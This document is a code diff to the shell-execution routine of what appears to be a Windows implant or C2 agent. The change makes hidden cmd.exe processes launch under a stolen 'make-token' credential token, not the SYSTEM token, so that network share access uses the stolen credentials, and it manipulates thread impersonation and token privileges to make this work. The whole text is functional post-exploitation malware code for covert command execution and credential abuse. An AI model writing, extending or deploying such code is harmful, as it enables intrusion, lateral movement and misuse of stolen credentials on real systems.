@@ -105,7 +105,32 @@ static char* run_shell(const char *cmd) {
         static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
         static const wchar_t cmd_cwd[] = L"C:\\Windows\\System32";
 
-        /* Enable required privileges on the calling process and the SYSTEM token. */
+        /* If the calling thread is currently impersonating (e.g. from make-token
+           with LOGON_NEW_CREDENTIALS), that impersonation token may lack
+           SeAssignPrimaryTokenPrivilege, causing CreateProcess*W to fail 1314.
+           Revert to the process primary token (SYSTEM) so full privileges are in
+           effect, then restore the impersonation after the child is running. */
+        HANDLE hSavedImp = NULL;
+        {
+            HANDLE hTh = NULL;
+            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hTh)) {
+                DuplicateTokenEx(hTh, TOKEN_ALL_ACCESS, NULL,
+                                 SecurityImpersonation, TokenImpersonation, &hSavedImp);
+                CloseHandle(hTh);
+                RevertToSelf();
+            }
+        }
+
+        /* Prefer the make-token credential token (g_stolen_token) for the child
+           process so UNC network access uses those credentials rather than the
+           machine account. Fall back to hSysTok when both are the same token. */
+        HANDLE hChildTok = hSysTok;
+        HANDLE hMakeTok = (HANDLE)InterlockedCompareExchangePointer(
+            (PVOID*)&g_stolen_token, NULL, NULL);
+        if (hMakeTok && hMakeTok != hSysTok)
+            hChildTok = hMakeTok;
+
+        /* Enable required privileges on the process primary token. */
         HANDLE hSelf = NULL;
         if (OpenProcessToken(GetCurrentProcess(),
                              TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf)) {
@@ -114,9 +139,9 @@ static char* run_shell(const char *cmd) {
             enable_privilege(hSelf, "SeAssignPrimaryTokenPrivilege");
             CloseHandle(hSelf);
         }
-        enable_privilege(hSysTok, "SeImpersonatePrivilege");
-        enable_privilege(hSysTok, "SeIncreaseQuotaPrivilege");
-        enable_privilege(hSysTok, "SeAssignPrimaryTokenPrivilege");
+        enable_privilege(hChildTok, "SeImpersonatePrivilege");
+        enable_privilege(hChildTok, "SeIncreaseQuotaPrivilege");
+        enable_privilege(hChildTok, "SeAssignPrimaryTokenPrivilege");
 
         /* Use the same token-launch path as the Go agent.  The child owns the
            redirection file, so seclogon never has to duplicate anonymous pipe
@@ -129,8 +154,10 @@ static char* run_shell(const char *cmd) {
         char redir_args[4096 + MAX_PATH + 32];
         int redir_len = snprintf(redir_args, sizeof(redir_args),
                                  "/d /c %s > \"%s\" 2>&1", cmd, out_path);
-        if (redir_len < 0 || (size_t)redir_len >= sizeof(redir_args))
+        if (redir_len < 0 || (size_t)redir_len >= sizeof(redir_args)) {
+            if (hSavedImp) { ImpersonateLoggedOnUser(hSavedImp); CloseHandle(hSavedImp); }
             return strdup("[error: shell command too long]");
+        }
         wchar_t wargs[4096 + MAX_PATH + 32];
         wchar_t wargs2[4096 + MAX_PATH + 32];
         MultiByteToWideChar(CP_ACP, 0, redir_args, -1, wargs,
@@ -144,20 +171,20 @@ static char* run_shell(const char *cmd) {
         BOOL proc_ok = FALSE;
         DWORD with_token_err = 0, as_user_err = 0, imp_err = 0;
         if (CreateProcessWithTokenW) {
-            proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs,
+            proc_ok = CreateProcessWithTokenW(hChildTok, 0, cmd_app, wargs,
                 CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
             if (!proc_ok) with_token_err = GetLastError();
         }
         if (!proc_ok && CreateProcessAsUserW) {
-            proc_ok = CreateProcessAsUserW(hSysTok, cmd_app, wargs2,
+            proc_ok = CreateProcessAsUserW(hChildTok, cmd_app, wargs2,
                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
             if (!proc_ok) as_user_err = GetLastError();
         }
         if (!proc_ok && CreateProcessWithTokenW) {
-            if (ImpersonateLoggedOnUser(hSysTok)) {
+            if (ImpersonateLoggedOnUser(hChildTok)) {
                 wchar_t wargs3[4096 + MAX_PATH + 32];
                 memcpy(wargs3, wargs, sizeof(wargs3));
-                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs3,
+                proc_ok = CreateProcessWithTokenW(hChildTok, 0, cmd_app, wargs3,
                     CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
                 if (!proc_ok) with_token_err = GetLastError();
                 RevertToSelf();
@@ -165,6 +192,8 @@ static char* run_shell(const char *cmd) {
                 imp_err = GetLastError();
             }
         }
+        /* Restore thread impersonation regardless of CreateProcess outcome */
+        if (hSavedImp) { ImpersonateLoggedOnUser(hSavedImp); CloseHandle(hSavedImp); }
         if (!proc_ok) {
             char *e = (char*)malloc(192);
             snprintf(e, 192,
